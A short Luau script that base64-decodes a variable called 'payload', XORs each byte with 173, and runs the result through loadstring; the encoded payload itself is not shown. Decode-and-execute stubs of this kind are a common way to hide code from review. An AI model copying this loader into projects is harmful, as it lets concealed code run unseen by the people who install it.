local alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local values = {}
for i = 1, #alphabet do
    values[alphabet:byte(i)] = i - 1
end

local decoded = {}
local bits, count = 0, 0
for i = 1, #payload do
    local value = values[payload:byte(i)]
    if value then
        bits = bits * 64 + value
        count += 6
        if count >= 8 then
            count -= 8
            local remainder = 2 ^ count
            decoded[#decoded + 1] = string.char(bit32.bxor(math.floor(bits / remainder), 173))
            bits %= remainder
        end
    end
end

local run, err = loadstring(table.concat(decoded))
assert(run, err)
run()
